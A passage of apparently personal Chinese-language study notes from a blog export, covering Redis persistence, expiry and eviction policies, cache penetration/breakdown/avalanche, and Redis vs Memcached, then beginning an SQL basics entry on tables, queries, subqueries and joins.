<p><mark>子进程带有主进程的数据副本</mark>，这里使用子进程而不是线程，因为如果是使用线程，多线程之间会共享内存，那么在修改共享内存数据的时候，需要通过加锁来保证数据的安全，而这样就会降低性能。而使用子进程，创建子进程时，父子进程是共享内存数据的，不过这个共享的内存只能以只读的方式，而当父子进程任意一方修改了该共享内存，就会发生<mark>写时复制（Copy On Write）</mark>，于是父子进程就有了独立的数据副本，就不用加锁来保证数据安全。</p>
</li>
</ul>
<h2 id="6-3-RDB-和-AOF-的混合持久化-Redis-4-0-新增">6.3 RDB 和 AOF 的混合持久化(Redis 4.0 新增)</h2>
<p>混合持久化工作在 <mark>AOF 日志重写过程</mark>，当开启了混合持久化时，在 AOF 重写日志时，fork 出来的重写子进程会先将与主线程共享的内存数据以 RDB 方式写入到 AOF 文件，然后主线程处理的操作命令会被记录在重写缓冲区里，重写缓冲区里的增量命令会以 AOF 方式写入到 AOF 文件，写入完成后通知主进程将新的含有 RDB 格式和 AOF 格式的 AOF 文件替换旧的的 AOF 文件。</p>
<p>也就是说，使用了混合持久化，AOF 文件的<strong>前半部分是 RDB 格式的全量数据，后半部分是 AOF 格式的增量数据</strong>。</p>
<p><strong>混合持久化优点：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>混合持久化结合了 RDB 和 AOF 持久化的优点，开头为 RDB 的格式，使得 Redis 可以更快的启动，同时结合 AOF 的优点，有减低了大量数据丢失的风险。</p>
</li>
</ul>
<p><strong>混合持久化缺点：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>AOF 文件中添加了 RDB 格式的内容，使得 AOF 文件的可读性变得很差；</p>
</li>
<li class="lvl-2">
<p>兼容性差，如果开启混合持久化，那么此混合持久化 AOF 文件，就不能用在 Redis 4.0 之前版本了。</p>
</li>
</ul>
<h1>7 Redis内存管理</h1>
<h2 id="7-1-过期键删除策略">7.1 过期键删除策略</h2>
<blockquote>
<p>内存容量有限，需要设置过期时间来释放内存。每当我们对一个 key 设置了过期时间时，Redis 会把该 key 带上过期时间存储到一个<strong>过期字典</strong>（expires dict）中，也就是说「过期字典」保存了数据库中所有 key 的过期时间。<br>
Redis 使用的过期删除策略是「<strong>惰性删除+定期删除</strong>」这两种策略配和使用。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>定时删除</strong>：在设置键的过期时间的同时，创建一个定时器( timer ), 让定时器在键的过期时间来临时，立即执行对键的删除操作。</p>
</li>
<li class="lvl-2">
<p><strong>惰性删除</strong>：放任键过期不管，但是每次从键空间中获取键时，都检查取得的键是否过期，如果过期的话，就删除该键；如果没有过期，就返回该键。</p>
</li>
<li class="lvl-2">
<p><strong>定期删除</strong>： 每隔一段时间，程序就对数据库进行一次检查，删除里面的过期键。至于要删除多少过期键，以及要检查多少个数据库，则由算法决定。<strong>每隔一段时间「随机」从数据库中取出一定数量的 key 进行检查，并删除其中的过期key。</strong></p>
</li>
<li class="lvl-3">
<p><strong>延迟队列</strong>：把设置过期时间的 key 放到一个延迟队列里，到期之后就删除 key。这种方式可以保证每个过期 key 都能被删除，但维护延迟队列太麻烦，队列本身也要占用资源。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>删除策略</th>
<th>CPU</th>
<th>内存</th>
</tr>
</thead>
<tbody>
<tr>
<td>定时删除</td>
<td>不友好</td>
<td>友好</td>
</tr>
<tr>
<td>惰性删除</td>
<td>友好</td>
<td>不友好</td>
</tr>
<tr>
<td>定期删除</td>
<td>取决于执行时长和频率</td>
<td>取决于执行时长和频率</td>
</tr>
<tr>
<td>通过<strong>过期字典</strong>判断数据是否过期：</td>
<td></td>
<td></td>
</tr>
<tr>
<td><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403231540506.png" alt="image.png"></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>仅仅通过给 key 设置过期时间还是有问题的。因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就 Out of memory 了。</p>
<h3 id="7-1-1-Redis-持久化时，对过期键会如何处理的？">7.1.1 Redis 持久化时，对过期键会如何处理的？</h3>
<p>RDB 文件分为两个阶段，RDB 文件生成阶段和加载阶段。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>RDB 文件生成阶段</strong>：从内存状态持久化成 RDB（文件）的时候，会对 key 进行过期检查，<strong>过期的键「不会」被保存到新的 RDB 文件中</strong>，因此 Redis 中的过期键不会对生成新 RDB 文件产生任何影响。</p>
</li>
<li class="lvl-2">
<p><strong>RDB 加载阶段</strong>：RDB 加载阶段时，要看服务器是主服务器还是从服务器，分别对应以下两种情况：</p>
<ul class="lvl-2">
<li class="lvl-6"><strong>如果 Redis 是「主服务器」运行模式的话，在载入 RDB 文件时，程序会对文件中保存的键进行检查，过期键「不会」被载入到数据库中</strong>。所以过期键不会对载入 RDB 文件的主服务器造成影响；</li>
<li class="lvl-6"><strong>如果 Redis 是「从服务器」运行模式的话，在载入 RDB 文件时，不论键是否过期都会被载入到数据库中</strong>。但由于主从服务器在进行数据同步时，从服务器的数据会被清空。所以一般来说，过期键对载入 RDB 文件的从服务器也不会造成影响。</li>
</ul>
</li>
</ul>
<p>AOF 文件分为两个阶段，AOF 文件写入阶段和 AOF 重写阶段。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>AOF 文件写入阶段</strong>：当 Redis 以 AOF 模式持久化时，<strong>如果数据库某个过期键还没被删除，那么 AOF 文件会保留此过期键，当此过期键被删除后，Redis 会向 AOF 文件追加一条 DEL 命令来显式地删除该键值</strong>。</p>
</li>
<li class="lvl-2">
<p><strong>AOF 重写阶段</strong>：执行 AOF 重写时，会对 Redis 中的键值对进行检查，<strong>已过期的键不会被保存到重写后的 AOF 文件中</strong>，因此不会对 AOF 重写造成任何影响。</p>
</li>
</ul>
<h3 id="7-1-2-Redis-主从模式中，对过期键会如何处理？">7.1.2 Redis 主从模式中，对过期键会如何处理？</h3>
<p>当 Redis 运行在主从模式下时，<strong>从库不会进行过期扫描，从库对过期的处理是被动的</strong>。也就是即使从库中的 key 过期了，如果有客户端访问从库时，依然可以得到 key 对应的值，像未过期的键值对一样返回。</p>
<p>从库的过期键处理依靠主服务器控制，<strong>主库在 key 到期时，会在 AOF 文件里增加一条 del 指令，同步到所有的从库</strong>，从库通过执行这条 del 指令来删除过期的 key。</p>
<h2 id="7-2-内存淘汰策略">7.2 内存淘汰策略</h2>
<blockquote>
<p>refcount: Redis的对象系统带有引用计数实现的内存回收机制，当一个对象不再被使用时，该对象所占用的内存就会被自动释放。<br>
lru: 该属性记录了对象最后一次被命令程序访问的时间：</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">redisObject</span>&#123;</span><br><span class="line">	type;</span><br><span class="line">	encoding;</span><br><span class="line">	ptr;</span><br><span class="line">	refcount;</span><br><span class="line">	lru;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-2-1-内存淘汰机制">7.2.1 内存淘汰机制</h3>
<p>在 Redis 的运行内存达到了某个阀值，就会触发<strong>内存淘汰机制</strong>，这个阀值就是我们设置的最大运行内存</p>
<blockquote>
<p>淘汰范围：设置过期时间的数据集、键空间淘汰策略：随机、最近最少使用、最不经常使用</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-3">
<p><strong>no-eviction</strong>：禁止淘汰数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。</p>
</li>
<li class="lvl-2">
<p><strong>volatile-ttl(time to live)</strong>：从已设置过期时间的数据集（<code>server.db[i].expires</code>）中挑选将要过期的数据淘汰。</p>
</li>
<li class="lvl-2">
<p><strong>volatile-lru（least recently used）</strong>：从已设置过期时间的数据集（<code>server.db[i].expires</code>）中挑选最近最少使用的数据淘汰。</p>
</li>
<li class="lvl-2">
<p><strong>allkeys-lru（least recently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）</p>
</li>
<li class="lvl-2">
<p><strong>volatile-random</strong>：从已设置过期时间的数据集（<code>server.db[i].expires</code>）中任意选择数据淘汰。</p>
</li>
<li class="lvl-2">
<p><strong>allkeys-random</strong>：从数据集（<code>server.db[i].dict</code>）中任意选择数据淘汰。</p>
</li>
<li class="lvl-2">
<p><strong>volatile-lfu（least frequently used）</strong>：从已设置过期时间的数据集（<code>server.db[i].expires</code>）中挑选<mark>最不经常使用</mark>的数据淘汰。</p>
</li>
<li class="lvl-2">
<p><strong>allkeys-lfu（least frequently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最不经常使用的 key。</p>
</li>
</ul>
<h3 id="7-2-2-LRU和LFU">7.2.2 LRU和LFU</h3>
<p><strong>LRU</strong> 全称是 Least Recently Used 翻译为<strong>最近最少使用</strong>，会选择淘汰最近最少使用的数据，根据<mark>访问时间</mark>淘汰数据。传统 LRU 算法的实现是基于「链表」结构，链表中的元素按照操作顺序从前往后排列，最新操作的键会被移动到表头，当需要内存淘汰时，只需要删除链表尾部的元素即可，因为链表尾部的元素就代表最久未被使用的元素。</p>
<p>但是 LRU 算法有一个问题，<strong>无法解决缓存污染问题</strong>，比如应用一次读取了大量的数据，而这些数据只会被读取这一次，那么这些数据会留存在 Redis 缓存中很长一段时间，造成缓存污染。</p>
<p>LFU 全称是 Least Frequently Used 翻译为<strong>最近最不常用的</strong>，LFU 算法是根据<mark>数据访问次数</mark>来淘汰数据的，它的核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。</p>
<p>所以， LFU 算法会记录每个数据的访问次数。当一个数据被再次访问时，就会增加该数据的访问次数。这样就解决了偶尔被访问一次之后，数据留存在缓存中很长一段时间的问题，相比于 LRU 算法也更合理一些。</p>
<h2 id="7-3-Redis内存碎片">7.3 Redis内存碎片</h2>
<p>1、Redis 存储数据的时候向操作系统申请的内存空间可能会大于数据实际需要的存储空间。<br>
<strong>2、频繁修改 Redis 中的数据也会产生内存碎片。</strong> 当 Redis 中的某个数据删除时，Redis 通常不会轻易释放内存给操作系统。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>内存分配策略，分配空间大于所需空间</p>
</li>
<li class="lvl-2">
<p>数据删除后没有释放内存</p>
</li>
</ul>
<blockquote>
<p>[!question] 假如MySQL有1000万数据，采用Redis作为中间缓存，取其中的10万，如何保证Redis中的数据都是热点数据？</p>
<ul class="lvl-1">
<li class="lvl-2">过期键删除策略</li>
<li class="lvl-2">内存淘汰策略</li>
</ul>
</blockquote>
<h1>8 Redis缓存问题</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403231720549.png" alt="image.png"></p>
<h2 id="8-1-缓存穿透">8.1 缓存穿透</h2>
<p>大量请求的 key 是不合理的，<strong>根本不存在于缓存中，也不存在于数据库中</strong> 。这就导致这些请求直接到了数据库上，根本没有经过缓存这一层，对数据库造成了巨大的压力，可能直接就被这么多请求弄宕机了。</p>
<h3 id="8-1-1-解决方法">8.1.1 解决方法</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>缓存无效key</strong>，设置较短的过期时间（表名:列名:主键名:主键值）</p>
</li>
<li class="lvl-2">
<p><strong>对查询的key进行参数合法性校验</strong>，比如长度、格式等</p>
</li>
<li class="lvl-2">
<p><strong>布隆过滤器</strong>：判断给定的数据是否存在，二进制向量（或者说位数组）和一系列随机映射函数（哈希函数）两部分组成的数据结构。（存放在布隆过滤器中的数据不容易删除，判断数据存在，实际不一定存在）</p>
</li>
<li class="lvl-2">
<p><strong>接口限流</strong>：根据用户或者 IP 对接口进行限流，对于异常频繁的访问行为，还可以采取黑名单机制，例如将异常 IP 列入黑名单。</p>
</li>
</ul>
<h2 id="8-2-缓存击穿">8.2 缓存击穿</h2>
<blockquote>
<p>缓存击穿中，请求的 key 对应的是 <strong>热点数据</strong> ，该数据 <strong>存在于数据库中，但不存在于缓存中（通常是因为缓存中的那份数据已经过期）</strong> 。这就可能会导致瞬时大量的请求直接打到了数据库上，对数据库造成了巨大的压力，可能直接就被这么多请求弄宕机了。</p>
</blockquote>
<h3 id="8-2-1-解决方法">8.2.1 解决方法</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><mark>设置热点数据永不过期或者过期时间比较长。</mark></p>
</li>
<li class="lvl-2">
<p>针对热点数据<strong>提前预热</strong>，将其存入缓存中并设置合理的过期时间比如秒杀场景下的数据在秒杀结束之前不过期。</p>
</li>
<li class="lvl-2">
<p>请求数据库写数据到缓存之前，先获取<mark>互斥锁，保证只有一个请求会落到数据库上</mark>，减少数据库的压力。 使用互斥锁，当缓存失效的时候，不是立即去load db，而是先使用缓存工具的某个机制，比如Redis的SETNX去设置一个锁，当操作返回成功时，再去load db并放入缓存；否则，就重试获取缓存值。</p>
</li>
</ul>
<h2 id="8-3-缓存雪崩">8.3 缓存雪崩</h2>
<blockquote>
<p>1.<strong>缓存在同一时间大面积的失效，导致大量的请求都直接落到了数据库上，对数据库造成了巨大的压力。</strong><br>
2.<strong>Redis故障宕机</strong></p>
</blockquote>
<h3 id="8-3-1-解决方法">8.3.1 解决方法</h3>
<p><strong>针对 Redis 服务不可用的情况：</strong></p>
<ol>
<li class="lvl-3">
<p><strong>采用 Redis 集群</strong>，避免单机出现问题整个缓存服务都没办法使用。</p>
</li>
<li class="lvl-3">
<p><strong>请求限流</strong>，避免同时处理大量的请求。只将少部分请求发送到数据库进行处理，再多的请求就在入口直接拒绝服务</p>
</li>
<li class="lvl-3">
<p>服务熔断，，暂停业务应用对缓存服务的访问，直接返回错误</p>
</li>
<li class="lvl-3">
<p>多级缓存，例如本地缓存+Redis 缓存的组合，当 Redis 缓存出现问题时，还可以从本地缓存中获取到部分数据。<mark>限流、降级、熔断</mark></p>
</li>
</ol>
<p><strong>针对热点缓存失效的情况：</strong></p>
<ol>
<li class="lvl-3">
<p><strong>设置不同的失效时间比如随机设置缓存的失效时间。</strong></p>
</li>
<li class="lvl-3">
<p>设置缓存不过期：通过后台服务来更新缓存数据。</p>
</li>
<li class="lvl-3">
<p>缓存预热，也就是在程序启动后或运行过程中，主动将热点数据加载到缓存中</p>
</li>
<li class="lvl-3">
<p>使用<strong>互斥锁</strong>，当缓存失效的时候，不是立即去load db，而是先使用缓存工具的某个机制，比如<mark>Redis的SETNX去设置一个锁，当操作返回成功时，再去load db并放入缓存；否则，就重试获取缓存值</mark>。</p>
</li>
<li class="lvl-3">
<p><strong>后台更新缓存</strong>，业务线程不再负责更新缓存，缓存也不设置有效期，而是<strong>让缓存“永久有效”，并将更新缓存的工作交由后台线程定时更新</strong>。</p>
</li>
</ol>
<h2 id="8-4-缓存预热如何实现？">8.4 <strong>缓存预热如何实现？</strong></h2>
<p>常见的缓存预热方式有两种：</p>
<ol>
<li class="lvl-3">
<p>使用定时任务，比如 xxl-job，来定时触发缓存预热的逻辑，将数据库中的热点数据查询出来并存入缓存中。</p>
</li>
<li class="lvl-3">
<p>使用消息队列，比如 Kafka，来异步地进行缓存预热，将数据库中的热点数据的主键或者 ID 发送到消息队列中，然后由缓存服务消费消息队列中的数据，根据主键或者 ID 查询数据库并更新缓存。</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405131129371.png" alt="image.png"></p>
<h1>9 Redis vs Memcached</h1>
<p><strong>共同点</strong>：</p>
<ol>
<li class="lvl-3">
<p>都是<mark>基于内存的数据库</mark>，一般都用来当做缓存使用。</p>
</li>
<li class="lvl-3">
<p>都有过期策略。</p>
</li>
<li class="lvl-3">
<p>两者的性能都非常高。</p>
</li>
</ol>
<p><strong>区别</strong>：</p>
<ol>
<li class="lvl-3">
<p>Redis 支持<mark>更丰富的数据类型</mark>（支持更复杂的应用场景）。Redis 不仅仅支持简单的 k/v 类型的数据，同时还提供 list，set，zset，hash 等数据结构的存储。Memcached 只支持最简单的 k/v 数据类型。</p>
</li>
<li class="lvl-3">
<p>Redis 支持<mark>数据的持久化</mark>，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用,而 Memcached 把数据全部存在内存之中。</p>
</li>
<li class="lvl-3">
<p><strong>Redis 有灾难恢复机制。</strong> 因为可以把缓存中的数据持久化到磁盘上。</p>
</li>
<li class="lvl-3">
<p><strong>Redis 在服务器内存使用完之后，可以将不用的数据放到磁盘上。但是，Memcached 在服务器内存使用完之后，就会直接报异常。</strong></p>
</li>
<li class="lvl-3">
<p><strong>Memcached 没有原生的集群模式，需要依靠客户端来实现往集群中分片写入数据；但是 Redis 目前是原生支持 cluster 模式的。</strong></p>
</li>
<li class="lvl-3">
<p>Memcached 是多线程，非阻塞 IO 复用的网络模型；Redis 使用单线程的多路 IO 复用模型。 （Redis 6.0 针对网络数据的读写引入了多线程）</p>
</li>
<li class="lvl-3">
<p><strong>Redis 支持发布订阅模型、Lua 脚本、事务等功能，而 Memcached 不支持。并且，Redis 支持更多的编程语言。</strong></p>
</li>
<li class="lvl-3">
<p><strong>Memcached 过期数据的删除策略只用了惰性删除，而 Redis 同时使用了惰性删除与定期删除。</strong></p>
</li>
</ol>
<blockquote>
<p>[!question] Redis存在数据安全性、数据一致性问题吗？</p>
</blockquote>
<p>两个用户读取数据状态，之后分别更新</p>
<p><a href="https://developer.aliyun.com/article/863103#:~:text=%E6%88%91%E4%BB%AC%E6%AD%A3%E5%B8%B8%E7%90%86%E8%A7%A3%E7%9A%84%E7%BA%BF">面试官问：Redis 是并发安全的吗？怎么做到的？-阿里云开发者社区 (aliyun.com)</a></p>
<h1>10 参考</h1>
<ol>
<li class="lvl-3">
<p><a href="https://javaguide.cn/database/redis/redis-skiplist.html#b-%E6%A0%91-vs-%E8%B7%B3%E8%A1%A8">Redis为什么用跳表实现有序集合 | JavaGuide</a></p>
</li>
<li class="lvl-3">
</li>
</ol>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL</title>
    <url>/2023/08/10/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1>1 基本概念</h1>
<p>DBMS(Datebase Managment System)<br>
DBS(Datebase System)<br>
DBA(Datebase Administrator)</p>
<h2 id="1-1-SQL分类">1.1 SQL分类</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>Data Definition Language(DDL)</p>
</li>
<li class="lvl-2">
<p>Data Manipulation Language(DML)</p>
</li>
<li class="lvl-2">
<p>Data Control Language(DCL)</p>
</li>
<li class="lvl-2">
<p><code>数据库（database）</code> - 保存有组织的数据的容器（通常是一个文件或一组文件）。</p>
</li>
<li class="lvl-2">
<p><code>数据表（table）</code> - 某种特定类型数据的结构化清单。</p>
</li>
<li class="lvl-2">
<p><code>模式（schema）</code> - 关于数据库和表的布局及特性的信息。模式定义了数据在表中如何存储，包含存储什么样的数据，数据如何分解，各部分信息如何命名等信息。数据库和表都有模式。</p>
</li>
<li class="lvl-2">
<p><code>列（column）</code> - 表中的一个字段。所有表都是由一个或多个列组成的。</p>
</li>
<li class="lvl-2">
<p><code>行（row）</code> - 表中的一个记录。</p>
</li>
<li class="lvl-2">
<p><code>主键（primary key）</code> - 一列（或一组列），其值能够唯一标识表中每一行。</p>
</li>
</ul>
<p>关系型数据库关系型数据库（RDB，Relational Database）就是一种建立在关系模型的基础上的数据库。关系模型表明了数据库中所存储的数据之间的联系（一对一、一对多、多对多）。</p>
<h1>2 创建表</h1>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span>(</span><br><span class="line">	`id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;自增ID&#x27;</span>, </span><br><span class="line">	`create_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>, </span><br><span class="line">	element type [<span class="keyword">unique</span>],</span><br><span class="line">	<span class="keyword">primary</span> key(a,b),</span><br><span class="line">	<span class="keyword">UNIQUE</span> KEY ``</span><br><span class="line">);</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">table</span> R;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">table</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">ADD</span> ele <span class="type">float</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">table</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">ADD</span> ele <span class="type">float</span> <span class="keyword">DEFAULT</span> <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">table</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">DROP</span> ele;</span><br></pre></td></tr></table></figure>
<p>primary key vs unique</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>主键只能有一个</p>
</li>
<li class="lvl-2">
<p>主键属性不能为NULL</p>
</li>
<li class="lvl-2">
<p>UNQIUE可以为NULL</p>
</li>
<li class="lvl-2">
<p><code>NOT NULL</code> - 指示某列不能存储 NULL 值。</p>
</li>
<li class="lvl-2">
<p><code>UNIQUE</code> - 保证某列的每行必须有唯一的值。</p>
</li>
<li class="lvl-2">
<p><code>PRIMARY KEY</code> - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</p>
</li>
<li class="lvl-2">
<p><code>FOREIGN KEY</code> - 保证一个表中的数据匹配另一个表中的值的参照完整性。</p>
</li>
<li class="lvl-2">
<p><code>CHECK</code> - 保证列中的值符合指定的条件。</p>
</li>
<li class="lvl-2">
<p><code>DEFAULT</code> - 规定没有给列赋值时的默认值。</p>
</li>
</ul>
<h1>3 Select查询</h1>
<p><code>DISTINCT</code> 用于返回唯一不同的值。它作用于所有列，也就是说所有列的值都相同才算相同。<br>
<code>LIMIT</code> 限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#属性重命名</span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">as</span> a_,b <span class="keyword">as</span> b_</span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line"><span class="keyword">where</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">AND</span> <span class="keyword">OR</span> <span class="keyword">NOT</span></span><br><span class="line"><span class="operator">=</span>, <span class="operator">&lt;&gt;</span> <span class="operator">&lt;</span> <span class="operator">&gt;</span> <span class="operator">&lt;=</span> <span class="operator">&gt;=</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>等于</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>不等于。注释：在 SQL 的一些版本中，该操作符可被写成 !=</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
</tr>
<tr>
<td>BETWEEN</td>
<td>在某个范围内</td>
</tr>
<tr>
<td>LIKE/not like</td>
<td>搜索某种模式，%(any string) _(any character)</td>
</tr>
<tr>
<td>IN</td>
<td>指定针对某个列的多个可能值</td>
</tr>
<tr>
<td>AND/OR.NOT</td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="3-1-查询结果重排序">3.1 查询结果重排序</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>ascending (ASC)：升序</p>
</li>
<li class="lvl-2">
<p>descending(DESC)</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sells <span class="keyword">where</span> bar<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> price <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure>
<h2 id="3-2-子查询">3.2 子查询</h2>
<blockquote>
<p>子查询就是指将一个 <code>select</code> 查询（子查询）的结果作为另一个 SQL 语句（主查询）的数据来源或者判断条件。子查询可以被用作a value or set<br>
子查询可以用在from和where子句中</p>
</blockquote>
<p>子查询可以嵌入 <code>SELECT</code>、<code>INSERT</code>、<code>UPDATE</code> 和 <code>DELETE</code> 语句中，也可以和 <code>=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>IN</code>、<code>BETWEEN</code>、<code>EXISTS</code> 等运算符一起使用。</p>
<p>子查询常用在 <code>WHERE</code> 子句和 <code>FROM</code> 子句后边：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>当用于 <code>WHERE</code> 子句时，根据不同的运算符，子查询可以返回单行单列、多行单列、单行多列数据。子查询就是要返回能够作为 <code>WHERE</code> 子句查询条件的值。</p>
</li>
<li class="lvl-2">
<p>当用于 <code>FROM</code> 子句时，一般返回多行多列数据，相当于返回一张临时表，这样才符合 <code>FROM</code> 后面是表的规则。这种做法能够实现多表联合查询。</p>
</li>
</ul>
<h3 id="3-2-1-IN">3.2.1 IN</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tuple</span>&gt;</span> IN (<span class="tag">&lt;<span class="name">subquery</span>&gt;</span>) </span><br><span class="line">NOT IN (<span class="tag">&lt;<span class="name">subquery</span>&gt;</span>)</span><br><span class="line">in表达式可以出现在where子句中</span><br></pre></td></tr></table></figure>
<h3 id="3-2-2-EXISTS">3.2.2 EXISTS</h3>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">EXISTS(&lt;subquery&gt;) <span class="keyword">is</span> <span class="keyword">true</span> <span class="keyword">if</span> <span class="keyword">and</span> only <span class="keyword">if</span> the subquery <span class="keyword">result</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">empty</span>.</span><br></pre></td></tr></table></figure>
<h3 id="3-2-3-ANY">3.2.3 ANY</h3>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">x = ANY(&lt;subquery&gt;) <span class="keyword">is</span> a <span class="built_in">boolean</span> condition <span class="keyword">that</span> <span class="keyword">is</span> <span class="literal">true</span> iff x <span class="keyword">equals</span> <span class="keyword">at</span> least one</span><br><span class="line">tuple <span class="keyword">in</span> <span class="keyword">the</span> subquery <span class="literal">result</span>.</span><br><span class="line">= could be any comparison operator.</span><br><span class="line">Example: x &gt;= ANY(&lt;subquery&gt;) means x <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">the</span> uniquely smallest tuple</span><br><span class="line">produced <span class="keyword">by</span> <span class="keyword">the</span> subquery.</span><br></pre></td></tr></table></figure>
<h3 id="3-2-4-ALL">3.2.4 ALL</h3>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">x &lt;&gt; ALL(&lt;subquery&gt;) <span class="keyword">is</span> <span class="keyword">true</span> iff <span class="keyword">for</span> every <span class="keyword">tuple</span> t <span class="keyword">in</span> the relation, x <span class="keyword">is</span> <span class="keyword">not</span> equal <span class="keyword">to</span></span><br><span class="line">t.</span><br><span class="line">That <span class="keyword">is</span>, x <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">in</span> the subquery <span class="keyword">result</span>.</span><br><span class="line">&lt;&gt; can be any comparison <span class="keyword">operator</span>.</span><br><span class="line">Example: x &gt;= ALL(&lt;subquery&gt;) means there <span class="keyword">is</span> no <span class="keyword">tuple</span> larger than x <span class="keyword">in</span> the</span><br><span class="line">subquery <span class="keyword">result</span>. </span><br></pre></td></tr></table></figure>
<h3 id="3-2-5-Bag语义">3.2.5 Bag语义</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>Sslect-from-where：bag semantics</p>
</li>
<li class="lvl-2">
<p>union 、intersection、difference：set semantic</p>
</li>
</ul>
<h3 id="3-2-6-控制Duplicate-Elimination">3.2.6 控制Duplicate Elimination</h3>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Force <span class="keyword">the</span> <span class="literal">result</span> <span class="keyword">to</span> be a <span class="keyword">set</span> <span class="keyword">by</span> SELECT DISTINCT . . .</span><br><span class="line">Force <span class="keyword">the</span> <span class="literal">result</span> <span class="keyword">to</span> be a bag (i.e., don&#x27;t eliminate duplicates) <span class="keyword">by</span> ALL, <span class="keyword">as</span> <span class="keyword">in</span> . . .</span><br><span class="line">UNION ALL . . .</span><br><span class="line">•</span><br></pre></td></tr></table></figure>
<h1>4 连接（join）</h1>
<blockquote>
<p>SQL JOIN 子句用于将两个或者多个表联合起来进行查询。连接表时需要在每个表中选择一个字段，并对这些字段的值进行比较，值相同的两条记录将合并为一条。<strong>连接表的本质就是将不同表的记录合并起来，形成一张新表。当然，这张新表只是临时的，它仅存在于本次查询期间</strong>。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Drinkers(name, addr)</span><br><span class="line">Frequents(drinker, bar)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Drinkers <span class="keyword">JOIN</span> Frequents <span class="keyword">ON</span> name <span class="operator">=</span> drinker</span><br><span class="line">(d,a,d,b)</span><br><span class="line">drinker d住在a，并且经常去b</span><br></pre></td></tr></table></figure>
<p>inner join：2表值都存在<br>
outer join：附表中值可能存在null的情况。</p>
<p>①A inner join B：取交集</p>
